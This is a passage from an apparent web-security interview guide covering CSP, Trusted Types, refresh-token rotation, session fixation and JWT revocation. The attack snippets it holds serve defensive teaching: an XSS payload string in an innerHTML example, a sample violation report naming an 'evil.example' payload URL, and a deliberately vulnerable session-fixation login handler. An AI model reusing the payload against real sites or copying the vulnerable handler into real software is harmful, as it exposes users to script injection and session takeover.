Content-Security-Policy: script-src 'self' 'unsafe-inline'   // XSS payloads still execute

// The fix: drop 'unsafe-inline', use nonces/hashes, and prefer allow-listing
// specific script PATHS or using strict-dynamic over broad origin trust.
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'

Project Example

A security assessment found that a company's CSP allow-listed a widely-used CDN for convenience, and that CDN happened to also host old JSONP API endpoints reachable by anyone. Combined with a minor reflected-XSS bug elsewhere that had been dismissed as "low severity because CSP blocks it," the assessor chained the JSONP bypass with the injection point to demonstrate full script execution despite the "protective" CSP. The team switched to nonce-based script trust and dropped the broad CDN origin allow-list entirely, keeping only the exact script paths needed.

Senior Engineer Perspective

This question separates people who've configured a CSP from people who've had one actually tested against them. The senior point: CSP's protection is only as strong as its weakest allowed origin, and "trusted" domains often host content the CSP author never audited (JSONP, open uploads, redirect endpoints). The mature stance treats CSP as probabilistic risk reduction, not a guarantee, and pushes toward nonce/hash-based strict policies precisely because they don't depend on trusting an entire origin's full content inventory.

Q36. How do you design a CSP violation-reporting pipeline, and what should you watch for in report-only mode?

ROI: ★★★ Frequency: Medium

Short Answer

Add a report-to (modern) or report-uri (legacy, still widely supported) directive pointing at an endpoint you control; the browser POSTs a JSON report every time a resource is blocked (or, in Report-Only mode, would have been blocked). Run in Content-Security-Policy-Report-Only first to collect what would break without actually breaking it, triage the reports to separate real violations from noise, fix the real ones, then flip to enforcing Content-Security-Policy — ideally keeping reporting on permanently, since a live violation in production after enforcement usually signals either an attempted attack or a regression.

Detailed Answer

What a violation report contains

Each report includes the blocked resource's URI, the violated directive, the document URI, and (helpfully) the line/column of the offending code where available — enough to triage without needing to reproduce the issue manually.

Sources of noise to filter

  • Browser extensions injecting their own scripts/styles into the page (common, unrelated to your app).
  • Ad-blockers and privacy tools that inject or block resources in ways that trip CSP.
  • Bots/scanners probing with malformed requests.

A raw firehose of reports is usually dominated by extension noise; grouping by blocked-uri pattern and filtering known extension URI schemes (chrome-extension://, moz-extension://) quickly separates real findings.

Operationalizing it

Rate-limit or sample the reporting endpoint (a popular page under real attack could generate a flood of reports); alert on new/unexpected violated-directive patterns rather than trying to eyeball every report; and treat a spike in enforced-mode violations as a live signal worth paging on, since it often means an XSS attempt is being actively blocked in production.

Code Example

// Report-only rollout: nothing is blocked, but violations are reported.
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  report-to csp-endpoint

Reporting-Endpoints: csp-endpoint="https://reports.example.com/csp"

// Legacy fallback directive (still broadly supported, simpler to set up):
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// A shape of what the browser POSTs on violation:
{
  "csp-report": {
    "document-uri": "https://app.example.com/dashboard",
    "violated-directive": "script-src-elem",
    "blocked-uri": "https://evil.example/payload.js",
    "line-number": 42
  }
}

// Server-side: filter obvious extension noise before alerting.
function isNoise(report) {
  return /^(chrome|moz|safari)-extension:\/\//.test(report["blocked-uri"] || "");
}

Project Example

A team's first attempt at enforcing CSP broke a checkout flow because a payment SDK injected an inline script the team hadn't accounted for. Running two weeks in report-only mode first surfaced this (and several browser-extension false positives) without any customer impact, letting the team add a scoped nonce to the payment SDK's script before flipping to enforcement. Post-launch, they kept reporting active in enforced mode and later got an early alert when a compromised third-party tag-manager script attempted to load a new external domain — the CSP blocked it and the report caught it in near real time.

Senior Engineer Perspective

The senior insight: reporting isn't just a rollout convenience, it's an ongoing detection signal. A spike in enforced-mode CSP violations for a directive you didn't recently change is one of the highest-signal, lowest-noise indicators available that something is actively probing or exploiting your app — treat it with the same seriousness as a WAF alert, not as a leftover debugging artifact to ignore once the policy "works."

Q37. Why do CSS-in-JS libraries and modern build tooling often clash with a strict CSP, and how do you resolve it?

ROI: ★★★★ Frequency: Medium

Short Answer

Many CSS-in-JS libraries inject <style> tags at runtime via JavaScript, which a strict style-src (no 'unsafe-inline') blocks by default, since injected inline styles look identical to a CSS-injection attack from the browser's point of view. The clean resolution is the same tool CSP offers for scripts: a nonce applied to the style tags the library generates — most mature CSS-in-JS libraries (Emotion, styled-components) support passing a nonce through to their runtime style injection specifically for this reason.

Detailed Answer

Why this is a real, common friction point

Teams adopting CSP for the first time often discover their CSS-in-JS solution is the single largest source of violations, because the library's core mechanism (computing styles at runtime and injecting a <style> tag) is architecturally indistinguishable from what an attacker's injected style would look like. This isn't a bug in the library — it's an inherent tension between "compute styles at runtime in JS" and "don't allow runtime-injected styles."

Resolution paths, roughly in order of preference

  • Nonce-based style injection: configure the library to stamp its generated <style> tags with the same per-request nonce used for scripts.
  • Extract styles at build time: switch (or partially switch) to a zero-runtime CSS solution (vanilla-extract, compiled CSS Modules, Tailwind) that emits static stylesheets, needing no 'unsafe-inline' at all.
  • Hash-based allow-listing for a small, stable set of generated styles — usually impractical for CSS-in-JS since content changes per render.
  • Last resort: scope 'unsafe-inline' narrowly to style-src only (never script-src) if a genuine migration isn't feasible yet — a materially smaller risk than inline script, but still a real gap (recall the CSS-exfiltration risk covered earlier in this chapter).

Code Example

// Emotion configured to stamp its injected <style> tags with the request nonce:
import createCache from "@emotion/cache";
const cache = createCache({ key: "app", nonce: cspNonceForThisRequest });

// styled-components equivalent -- pass the nonce via a StyleSheetManager:
import { StyleSheetManager } from "styled-components";
<StyleSheetManager disableCSSOMInjection nonce={cspNonceForThisRequest}>
  <App />
</StyleSheetManager>

// CSP must then allow that specific nonce for styles too:
Content-Security-Policy: style-src 'self' 'nonce-r4nd0m'

// Last-resort, narrowly-scoped fallback if a nonce wiring isn't feasible yet
// (accept the smaller residual risk, never do this for script-src):
Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-r4nd0m'

Project Example

Rolling out CSP on a large app using styled-components generated thousands of report-only violations purely from runtime style injection, initially making the rollout look far riskier than it was. Wiring the library's nonce support through the SSR request pipeline (generating one nonce per response and threading it to both scripts and the style-sheet manager) eliminated nearly all of the noise in a single change, leaving only a handful of genuine third-party-script findings to address separately.

Senior Engineer Perspective

Interviewers ask this to see whether you've actually operated CSP against a real modern frontend stack rather than a toy example. The senior answer names the specific tension (runtime style injection vs. strict style-src) and the specific fix (threading a shared nonce to both scripts and the CSS-in-JS runtime), and knows that style-src 'unsafe-inline' is a meaningfully smaller risk than script-src 'unsafe-inline' if a full migration has to be staged — but still isn't free, given CSS-based exfiltration techniques.

Q38. If a page sends multiple Content-Security-Policy headers (or one via header and one via meta tag), how do they combine?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Multiple CSP sources don't override each other — they combine by intersection. The browser enforces the most restrictive result across all policies: a resource must be allowed by every applicable policy to load. This is a common source of confusing bugs when, say, a CDN/edge layer injects its own baseline CSP header and the app also sets one, or a policy is set both via header and via a <meta http-equiv="Content-Security-Policy"> tag — the effective policy is the narrowest overlap of all of them, not the union.

Detailed Answer

Why intersection, not override

This design exists so that an infrastructure layer (a CDN, a security gateway) can enforce a mandatory baseline that application code cannot accidentally loosen — if policies simply overrode each other, an app-level bug (or attacker with limited injection capability) could weaken a platform-enforced protection.

The common footgun

A team debugging "why is this allow-listed origin still blocked" often discovers a second CSP source (an edge/CDN default policy, a legacy meta tag left over from a previous implementation) that doesn't include the origin, silently narrowing the effective policy below what the app-level header alone specifies. This is invisible unless you inspect the full response headers and any CSP <meta> tags together.

Practical guidance

  • Maintain exactly one authoritative source for CSP per environment where possible; if infrastructure-level and app-level policies must coexist, document both and reconcile them intentionally rather than discovering the intersection by trial and error.
  • Prefer the HTTP header over a <meta> tag when you have the choice — the header applies before any HTML parses and covers directives (like frame-ancestors and reporting) that a meta tag cannot express at all.
  • When debugging an unexpected block, check all CSP sources on the response (headers, proxies, meta tags) before assuming the app's own policy is wrong.

Code Example

// CDN/edge layer sets a baseline policy on every response:
Content-Security-Policy: default-src 'self'

// App layer ALSO sets its own, more permissive-looking policy:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

// EFFECTIVE result is the intersection -- script-src is allowed self + the CDN,
// but nothing else is loosened beyond what BOTH policies permit; if the edge
// layer's baseline lacked "https://cdn.example.com" in some other directive,
// that resource is still blocked despite the app's header appearing to allow it.

// frame-ancestors, in particular, CANNOT be set via a <meta> tag at all --
// it is silently ignored there, so it must come from the HTTP header.
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"> <!-- no effect -->

Project Example

A team spent an afternoon convinced their CSP config was buggy because a newly allow-listed analytics domain kept getting blocked despite appearing correctly in the app's response header. The actual cause was an edge/CDN layer applying its own older baseline CSP that had never been updated with the new domain — the two policies intersected down to the CDN's stricter, outdated list. Centralizing CSP management into a single source (removing the redundant edge-level policy) fixed the immediate bug and prevented the next person from hitting the same confusing debugging session.

Senior Engineer Perspective

This is a favorite question for probing whether someone has actually debugged CSP in a real multi-layer deployment (CDN + app server + possibly a meta tag left over from migration) versus only having configured it once in a tutorial. The senior answer states the intersection rule confidently and immediately generalizes to the practical debugging implication: always check every layer emitting a CSP header before assuming your own app-level policy is incorrect, and remembers that frame-ancestors specifically requires the HTTP header, not a meta tag.

Q39. How should CSP be configured differently when your page embeds a third-party widget you don't fully control?

ROI: ★★★★ Frequency: Medium

Short Answer

A third-party widget (chat, payments, ads, analytics) typically needs its own script origin allow-listed, its own connect-src targets for the requests it makes, and often its own frame-src if it embeds an iframe internally — each grant widens your CSP's trust surface specifically for that vendor. The core discipline is scoping those grants as narrowly as possible (exact subdomains/paths, not wildcard domains) and treating each third-party addition as a deliberate, reviewed change to your trust boundary, not a drive-by "just add the domain" fix when something breaks.

Detailed Answer

What a typical widget actually needs

  • script-src: the exact origin serving the widget's JS (avoid wildcarding an entire vendor's domain if they publish from a specific subpath/subdomain).
  • connect-src: wherever the widget's runtime calls out to (often a different subdomain than where the script itself loads — check the vendor's own documentation/network tab, don't guess).
  • frame-src: if the widget renders its own iframe (many chat/payment widgets do), that origin needs explicit allow-listing too.
  • img-src/style-src: avatars, emoji, or injected styling the widget brings along.

The trust you're actually extending

Every origin you add to script-src is an origin whose current and future code runs with your app's full privileges — if that vendor is later compromised, or pushes a bad update, your CSP does not protect you from it, because you explicitly trusted it. This is the frontend expression of the general third-party/supply-chain risk: a widget vendor compromise is functionally equivalent to an XSS on your own site.

Reducing the blast radius further

  • Where the vendor supports it, load the widget inside a sandboxed iframe on a separate origin rather than directly in your page's script context — this contains a compromised widget instead of granting it full-page access.
  • Use Subresource Integrity on any third-party script loaded from a URL you control the version of, so a tampered file fails to execute.
  • Periodically re-review the actual set of allow-listed third-party origins — vendors get acquired, deprecated, or repurpose domains, and a stale allow-list entry is a dangling trust grant.

Code Example

// Scoped, specific grants for one chat widget vendor -- not a wildcard.
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' https://widget.chatvendor.com;
  connect-src 'self' https://api.chatvendor.com https://widget.chatvendor.com;
  frame-src 'self' https://embed.chatvendor.com;
  img-src 'self' https://cdn.chatvendor.com data:;

// Subresource Integrity on the vendor script, so a tampered file won't run:
<script
  src="https://widget.chatvendor.com/v2/widget.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>

// Preferable containment: run the widget in a sandboxed, separate-origin
// iframe rather than directly in the page's own script context.
<iframe src="https://widget.chatvendor.com/embed" sandbox="allow-scripts allow-forms"></iframe>

Project Example

A support-chat integration originally shipped by directly injecting the vendor's script into the main app bundle's execution context, with script-src loosened to the vendor's entire domain (they published from many paths). When the vendor had an unrelated security incident, the team had to scramble to assess whether their own users' data was exposed, since the widget ran with full access to the app's DOM and cookies. Migrating to the vendor's sandboxed-iframe embed option and narrowing the CSP grant to the exact subdomain paths actually used meant a future vendor-side incident would no longer automatically become the app's incident too.

Senior Engineer Perspective

The senior framing ties CSP configuration directly to supply-chain risk management: every third-party script origin you allow-list is a standing grant of your app's full trust, and it should be reviewed with the same rigor as a new npm dependency, not treated as a one-time CSP-tweak-until-it-works task. Bonus points for naming SRI and sandboxed-iframe containment as complementary controls that reduce the damage if the vendor is ever compromised, rather than relying on CSP allow-listing alone.

Q40. How does the require-trusted-types-for directive interact with the rest of your CSP, and what's a realistic migration path to it?

ROI: ★★★ Frequency: Low-Medium

Short Answer

require-trusted-types-for 'script' is a CSP directive that activates the Trusted Types enforcement discussed earlier — it works alongside script-src/style-src, not instead of them. Where script-src controls which script sources may execute, Trusted Types controls which strings may ever reach a DOM-injection sink like innerHTML in the first place — they defend against different attack shapes (loading an unauthorized script vs. writing unsanitized markup into an authorized one) and are meant to be layered together.

Detailed Answer

Why you need both, not either

script-src stops the browser from executing a <script> tag or eval call that isn't authorized. It does nothing to stop el.innerHTML = attackerString from injecting an <img onerror=...> — that's markup, not a script tag, and doesn't trip script-src at all in most cases (image-based XSS payloads execute via an event handler, which is a different enforcement path). Trusted Types closes exactly that remaining gap by gating the sink itself.

A realistic migration path

  1. Ship Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types default and collect violation reports for every existing sink usage across the app and its dependencies.
  2. Triage: some violations come from your own code (fixable directly), some from third-party libraries that don't yet support Trusted Types (may need a wrapper policy, an upstream fix, or a swapped dependency).
  3. Register one or a small number of well-audited policies (typically backed by DOMPurify) and route legitimate sink usage through them explicitly.
  4. Flip to enforcing once violations drop to zero (or to only known/accepted exceptions), and keep reporting on indefinitely as a live detection signal.

Known friction points

Some UI libraries and analytics/ad-tech scripts still directly assign to innerHTML internally without any Trusted Types awareness, which will simply break under enforcement until the library updates or you find an alternative — budget time for this in any migration, it is rarely a one-week effort for a large legacy app.

Code Example

// Full policy combining both layers -- script-src/style-src control WHAT
// scripts/styles are allowed to load; Trusted Types controls what strings
// may reach dangerous DOM sinks at all.
Content-Security-Policy:
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self' 'nonce-r4nd0m';
  require-trusted-types-for 'script';
  trusted-types default dompurify

// Registering the policy once, early in bootstrap:
trustedTypes.createPolicy("dompurify", {
  createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
});

// Even with a "safe" script-src, THIS still requires Trusted Types to catch:
el.innerHTML = "<img src=x onerror=steal()>"; // no <script> tag involved at all
// -> throws under enforcement unless routed through the registered policy first.

Project Example

A team had a mature nonce-based script-src policy and assumed it covered XSS thoroughly, until a report-only Trusted Types rollout revealed dozens of direct innerHTML assignments across the codebase and a couple of embedded third-party widgets — none of which script-src had ever flagged, since none involved loading an unauthorized script file. Most call sites were routed through a shared DOMPurify-backed policy within a sprint; two vendor widgets required contacting the vendor for a Trusted-Types-compatible build, which took longer and was tracked as an accepted temporary exception.

Senior Engineer Perspective

The senior point worth making explicitly: script-src and Trusted Types defend against genuinely different attack shapes, and teams that only have the former often believe they're more protected against DOM-XSS than they actually are. Framing a Trusted Types rollout as "finishing the job" that CSP's script controls started — rather than a redundant extra step — signals a precise mental model of what each layer actually guarantees.

Q41. What is refresh token rotation, and how does reuse detection help catch a stolen token?

ROI: ★★★★★ Frequency: High

Short Answer

Refresh token rotation means every time a refresh token is used to mint a new access token, the server also issues a brand-new refresh token and invalidates the old one — so each refresh token is single-use. Reuse detection is the security payoff: if the old, already-invalidated refresh token is ever presented again, the server knows two parties now think they hold a valid token (the legitimate client and whoever stole an earlier one), and it can revoke the entire token family and force re-authentication, cutting off the attacker even if they'd already used the stolen token successfully once.

Detailed Answer

Why single-use, chained tokens matter

A static, long-lived refresh token that's stolen once is valid forever (until its long expiry or manual revocation). Rotation limits a stolen token's useful life to the tiny window between theft and the legitimate client's next natural refresh — after that, either the attacker or the legitimate user will present an already-superseded token, triggering reuse detection.

How reuse detection actually flags theft

The server tracks a chain/family of refresh tokens per session. Each rotation marks the previous token as spent. If a spent token is presented again, that's a strong signal of compromise — a legitimate client would never reuse a token it already exchanged. The server response: invalidate the entire chain (not just the one token), forcing a fresh login, and optionally alert the security team or the user.

Operational details worth knowing

  • Handle the race where a client refreshes twice in quick succession (network retry) without falsely triggering revocation — a short grace window or idempotency key per rotation attempt avoids false positives.
  • Bind refresh tokens to a device/session fingerprint where possible, so a stolen token used from a wildly different context is an additional signal.
  • Store only a hash of the refresh token server-side (like a password), so a database leak doesn't hand out usable tokens directly.

Code Example

// Server-side refresh handler with rotation + reuse detection (conceptual).
async function refresh(oldRefreshToken) {
  const record = await db.findRefreshToken(hash(oldRefreshToken));

  if (!record) {
    throw new AuthError("unknown token"); // never issued, or already purged
  }
  if (record.revoked) {
    // REUSE DETECTED: this token was already rotated away once before.
    await db.revokeTokenFamily(record.familyId); // kill the whole chain
    await notifySecurityTeam(record.userId, "refresh token reuse detected");
    throw new AuthError("session revoked, please log in again");
  }

  // Normal path: rotate -- issue a new token, mark this one spent.
  const newRefreshToken = generateToken();
  await db.markRevoked(record.id);
  await db.insertRefreshToken({
    hash: hash(newRefreshToken),
    familyId: record.familyId,
    userId: record.userId,
  });
  const accessToken = signAccessToken(record.userId);
  return { accessToken, refreshToken: newRefreshToken };
}

Project Example

A SaaS product moved from static, long-lived refresh tokens to rotating tokens with reuse detection after an incident where a stolen token (via a malicious browser extension on a customer's machine) remained usable for weeks undetected. Post-migration, an attempted reuse of an already-rotated token from an unexpected IP triggered automatic revocation of the session family and an alert, cutting the exposure window from "however long until someone notices" to effectively one refresh cycle.

Senior Engineer Perspective

The senior insight is that rotation's value is almost entirely in the reuse detection, not merely in shortening token lifetime — a rotated-but-undetected theft is only marginally better than a static token. Interviewers listen for whether you mention revoking the whole chain (not just the reused token) and handling the legitimate double-refresh race condition, since a naive implementation that logs out real users on every flaky network retry gets disabled by frustrated product teams within a week of shipping.

Q42. What is session fixation, and how does regenerating the session ID on login prevent it?

ROI: ★★★★ Frequency: Medium

Short Answer

Session fixation is an attack where the attacker gets the victim to authenticate under a session identifier the attacker already knows — for example, by planting a session ID in the victim's cookie before they log in, then simply using that same known ID afterward to ride the now-authenticated session. It works whenever a server accepts a pre-existing session ID and merely "upgrades" it to authenticated status on login, rather than issuing a fresh, unpredictable ID. The fix: always regenerate the session identifier at the moment of authentication (and on any privilege change), invalidating whatever ID existed before.

Detailed Answer

How an attacker plants a known session ID

Depending on the app's session handling, this can be as simple as sending the victim a link containing a session parameter, or exploiting a subdomain/related site that can set a cookie readable by the target app, or via any XSS/CSRF that lets the attacker write a cookie. The specific delivery mechanism varies; the common thread is the attacker chooses the session identifier the victim ends up using.

Why regeneration is the fix, not just "use HTTPS" or "use httpOnly"

Those controls help with different problems (eavesdropping, XSS-readability) but don't address fixation at all — fixation doesn't require the attacker to ever read the session ID, only to have chosen it in advance. Regenerating the ID on login means the attacker's pre-planted value becomes worthless the instant the victim authenticates, because the server switches to a new value the attacker never saw.

Where else to regenerate

Beyond login: on privilege escalation (switching to an admin role, elevating scope), and on logout-then-login-as-different-user flows (never reuse a session slot across identities). Treat any authentication-state transition as a reason to mint a fresh identifier.

Code Example

// VULNERABLE: the same session object/cookie ID persists across login --
// whoever set the pre-auth session ID controls the post-auth one too.
app.post("/login", (req, res) => {
  if (validCredentials(req.body)) {
    req.session.userId = user.id; // just flips a flag on the EXISTING session
    res.redirect("/dashboard");
  }
});

// FIXED: regenerate the session ID at the moment of authentication.
app.post("/login", (req, res) => {
  if (validCredentials(req.body)) {
    req.session.regenerate((err) => {          // mints a brand-new session ID
      req.session.userId = user.id;              // set auth state on the NEW session
      res.redirect("/dashboard");
    });
  }
});

Project Example

An older internal tool accepted a session ID via a URL parameter for a since-removed "shareable session" feature, but had never removed the underlying support for reading it. A penetration test showed an attacker could send a colleague a link containing a chosen session ID; once the colleague logged in, the attacker used the same ID to access their now-authenticated session. Removing URL-based session propagation entirely and adding explicit session regeneration on every login closed both the specific flaw and the broader fixation risk pattern.

Senior Engineer Perspective

This question checks whether you distinguish session-fixation from session-hijacking (stealing an existing valid session) — they're related but the fix is different: hijacking is addressed by protecting the token in transit/storage, fixation is addressed by never letting a pre-authentication identifier survive into a post-authentication state. A senior candidate names "regenerate on every privilege transition, not just initial login" as the generalized rule, since the same fixation pattern can resurface anywhere a session persists across an authorization boundary.

Q43. How do you implement logout / session revocation across multiple devices when using stateless JWTs?

ROI: ★★★★ Frequency: High

Short Answer

A pure stateless JWT is validated purely by signature, so the server has no record to delete — "logout everywhere" is impossible until the token's natural expiry, no matter what the client does. To actually support revocation, you need some server-side state: either a short access-token lifetime backed by a revocable, server-tracked refresh token (the common pattern), or an explicit denylist/allowlist the server checks on each request. The trade-off is the classic stateless-vs-stateful one — pure statelessness and real-time revocability are in tension, and most production systems accept a small amount of server state to get revocation.

Detailed Answer

Pattern 1 — short-lived access token + revocable refresh token

Keep access tokens stateless but short-lived (minutes). "Logout everywhere" revokes the user's refresh token(s) server-side; existing access tokens simply expire naturally within minutes, giving a bounded (not instant) revocation window. This is the most common real-world compromise: instant revocation of the ability to get new tokens, near-instant revocation of the tokens themselves.

Pattern 2 — server-side session/denylist check

For near-instant revocation of the access token itself, the server checks a fast store (Redis) on every request: either an allowlist of currently-valid session IDs referenced by the JWT's jti claim, or a denylist of revoked ones. This reintroduces a database/cache lookup per request, partially defeating the "stateless" appeal of JWTs but giving true immediate revocation.

Multi-device considerations

  • Track sessions/refresh-tokens per device/client, not just per user, so "log out this device" and "log out everywhere" are both expressible.
  • Surface an active-sessions UI ("these devices are logged in") so users can self-service revoke a lost/stolen device's access.
  • On password change or suspected compromise, revoke all refresh tokens for the user, forcing every device to re-authenticate.

Code Example

// Pattern 1: short-lived stateless access token, revocable refresh token.
// "Logout everywhere" just deletes/revokes refresh tokens server-side --
// existing access tokens age out naturally within their short TTL.
async function logoutEverywhere(userId) {
  await db.revokeAllRefreshTokens(userId); // no more NEW access tokens issuable
  // any already-issued access token remains valid for <= its short TTL (e.g. 10 min)
}

// Pattern 2: near-instant revocation via a fast per-request check.
async function verifyAccessToken(token) {
  const payload = jwt.verify(token, PUBLIC_KEY); // signature check, stateless
  const revoked = await redis.sismember("revoked_jti", payload.jti); // stateful check
  if (revoked) throw new AuthError("token revoked");
  return payload;
}
async function logoutEverywhereInstant(userId) {
  const activeJtis = await db.getActiveJtisForUser(userId);
  await redis.saddMany("revoked_jti", activeJtis); // immediate effect on next request
}

Project Example

A team initially shipped pure stateless JWTs with a 24-hour lifetime and no revocation path at all, discovering the problem only when a support ticket asked "how do I log out a stolen laptop remotely?" and the honest answer was "wait up to 24 hours." They shipped a short-lived (10-minute) access token backed by a revocable, per-device refresh token, plus an active-sessions settings page letting users revoke individual devices — closing the gap to a maximum 10-minute exposure window after a user-initiated revocation.

Senior Engineer Perspective

This question is a good filter for whether someone actually understands the stateless-JWT trade-off or just likes JWTs because they're trendy. The senior answer states plainly that true statelessness and real-time revocation are mutually exclusive, names the specific compromise chosen (short TTL + revocable refresh vs. a live denylist check), and can articulate the operational cost of each (bounded exposure window vs. added per-request store lookup) rather than presenting either as a free lunch.

Q44. What is the "silent refresh via hidden iframe" pattern, and why has it fallen out of favor?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Silent refresh via hidden iframe was an older SPA pattern for renewing an access token without a full-page redirect: the app loads the identity provider's authorization endpoint in a hidden <iframe>, relying on the provider's own session cookie (already present from a prior login) to silently issue a new token via postMessage back to the parent, with no visible UI. It has fallen out of favor mainly because major browsers' third-party-cookie restrictions (Safari's ITP and similar tracking-prevention efforts elsewhere) increasingly block the identity provider's session cookie from being readable inside a cross-site iframe context, breaking the mechanism outright and unpredictably across browsers.

Detailed Answer

How it used to work

The SPA embeds <iframe src="https://idp.example.com/authorize?...&prompt=none">. If the user still has a valid session with the identity provider (a cookie on the IdP's domain), the IdP silently redirects within the iframe and hands back a token via a same-window postMessage, all invisible to the user. If the session had expired, the IdP would instead need to show a login prompt, which an invisible iframe can't meaningfully do — the app had to detect this failure and redirect the whole page.

Why browsers broke it

Anti-tracking features increasingly partition or block cookies in cross-site iframe contexts specifically because that exact mechanism (a hidden iframe silently checking your logged-in state on another site) is also precisely how cross-site tracking pixels/widgets operate. Browsers can't distinguish "legitimate silent SSO refresh" from "tracking script checking your login state elsewhere," so tightening third-party cookie access in iframes — a privacy win — collaterally broke this auth pattern.

What replaced it

  • Refresh tokens (rotating, in an httpOnly cookie or held server-side in a BFF) that don't depend on cross-site iframe cookie access at all.
  • Top-level redirects for renewal when silent renewal isn't reliable, accepting a brief visible flicker/loading state instead of a truly invisible iframe.
  • BFF (Backend-for-Frontend) pattern: the server holds the session/tokens and the browser only ever holds a same-site session cookie, sidestepping cross-site cookie access entirely.

Code Example

// The old pattern -- increasingly unreliable across browsers today:
function silentRefresh() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = `${IDP}/authorize?client_id=${CLIENT_ID}&response_type=code&prompt=none`;
    window.addEventListener("message", function handler(e) {
      if (e.origin !== IDP) return;
      window.removeEventListener("message", handler);
      document.body.removeChild(iframe);
      e.data.token ? resolve(e.data.token) : reject(new Error("silent refresh failed"));
    });
    document.body.appendChild(iframe);
  });
  // FAILS SILENTLY (and often unpredictably per-browser) if the IdP's own
  // session cookie is partitioned/blocked in this cross-site iframe context.
}

// Modern replacement: refresh via a same-site, top-level request against
// YOUR OWN backend, which holds the actual provider relationship server-side.
async function refresh() {
  const res = await fetch("/auth/refresh", { method: "POST", credentials: "include" });
  return (await res.json()).accessToken;
}

An app relying on hidden-iframe silent refresh saw a spike in unexplained "please log in again" prompts specifically on Safari after an ITP update, while Chrome users were mostly unaffected — a classic sign of third-party-cookie-dependent auth breaking non-uniformly. The team migrated to a BFF-style architecture where their own backend held the refresh relationship with the identity provider, and the browser only ever dealt with a same-site session cookie against their own domain, eliminating the cross-site cookie dependency entirely.

Senior Engineer Perspective

This question rewards awareness of how privacy-motivated browser changes ripple into auth architecture decisions that look unrelated at first glance. A senior candidate connects "why did silent refresh get unreliable" directly to third-party cookie partitioning, rather than treating it as a mysterious flaky bug, and can explain why the BFF pattern is currently favored specifically because it removes the SPA's dependency on cross-site cookie behavior altogether — a durable fix rather than a browser-specific workaround.

Q45. Is storing a token in a Web Worker meaningfully safer than localStorage against XSS?

ROI: ★★★ Frequency: Low

Short Answer

Somewhat, but it's a narrower improvement than it first sounds. A dedicated Web Worker has its own global scope, separate from the main thread's window/DOM — so a token held only inside the worker isn't directly reachable by a main-thread XSS payload doing localStorage.getItem(...) or reading a JS variable. But an attacker with script execution on your origin can still postMessage the worker and ask it to make a request on their behalf (proxying through it), so it mitigates direct token theft while doing little against abuse of the token in place — the same fundamental limit that applies to httpOnly cookies.

Detailed Answer

What actually improves

If the worker is the only code that ever holds the raw token, and it only exposes a narrow message-based API ("make this specific type of API call"), then XSS on the main thread cannot directly exfiltrate the token value — it can only ask the worker to perform whatever actions the worker's own API surface allows. This is a real containment improvement over a bare module-scope variable or localStorage, which hand the token over completely to any script running on the page.

What doesn't improve

If the worker's exposed API is broad ("make any request I ask, with any headers"), an XSS payload can simply drive the worker to make attacker-chosen authenticated requests — functionally similar to the httpOnly-cookie situation where the attacker can act as the user without literally reading the credential. The security value is entirely in how narrow and purpose-built the worker's exposed interface is.

Practical caveats

  • Workers add real complexity (message-passing overhead, harder debugging, browser support nuances for SharedWorker across tabs) for a partial mitigation — evaluate whether that cost is worth it versus simpler patterns (short-lived in-memory token + solid CSP/sanitization).
  • This pattern is uncommon in production apps precisely because the complexity-to-benefit ratio is often unfavorable compared to just investing harder in XSS prevention directly.

Code Example

// worker.js -- holds the token; exposes only a narrow, purpose-built API.
let token = null;
self.onmessage = async (e) => {
  if (e.data.type === "SET_TOKEN") { token = e.data.token; return; }
  if (e.data.type === "FETCH_ORDERS") {
    const res = await fetch("/api/orders", { headers: { Authorization: `Bearer ${token}` } });
    self.postMessage({ type: "ORDERS_RESULT", data: await res.json() });
    return;
  }
  // NOT exposed: an arbitrary "make any request with any headers" message type --
  // that would let an XSS payload drive the worker into exfiltrating anything.
};

// main.js -- the token itself never touches window/DOM-reachable scope.
const worker = new Worker("worker.js");
worker.postMessage({ type: "SET_TOKEN", token: accessToken });
worker.postMessage({ type: "FETCH_ORDERS" });
worker.onmessage = (e) => renderOrders(e.data.data);

Project Example

A team experimented with moving token storage into a dedicated worker after a security review flagged in-memory main-thread token storage as XSS-readable. They found the real risk reduction depended entirely on keeping the worker's message API narrow — their first draft exposed a generic "proxy this fetch" message type, which a reviewer correctly pointed out gave an XSS payload the same practical capability as reading the token directly. Redesigning the API to only permit a handful of named, purpose-specific operations delivered the intended containment benefit.

Senior Engineer Perspective

The senior nuance interviewers want: this pattern's security value is a direct function of API surface narrowness, not the mere fact of using a worker. It's conceptually the same trade as httpOnly cookies — hiding the credential's value without eliminating the attacker's ability to use it through the exposed interface. A strong candidate notes that, given the added complexity, most teams get more security value per unit effort from hardening XSS defenses (CSP, Trusted Types, sanitization) than from token-hiding architecture, since a sufficiently capable XSS defeats both eventually.

Q46. How should a SPA propagate logout and token state across multiple open browser tabs?

ROI: ★★★ Frequency: Medium

Short Answer

If auth state (tokens, login/logout) lives only in per-tab memory or isn't explicitly synchronized, logging out in one tab leaves other open tabs silently "logged in" until their next failed request — confusing at best, a security lapse on a shared/public computer at worst. The standard fix is a cross-tab messaging channel — BroadcastChannel (or a storage event on a shared localStorage key as a fallback) — so a logout/token-refresh event in one tab immediately propagates to every other open tab of the same origin.

Detailed Answer

Why this matters more than it seems

On a shared or public machine, a user who logs out expecting to be fully signed out, while a second tab from earlier in the session remains functionally authenticated (its in-memory access token still valid until natural expiry), creates a real exposure window — anyone else using that machine can still act through the "still logged in" tab.

BroadcastChannel vs. localStorage events

  • BroadcastChannel: a purpose-built same-origin, cross-tab (and cross-worker) messaging API — clean, doesn't require writing dummy values to storage just to trigger an event.
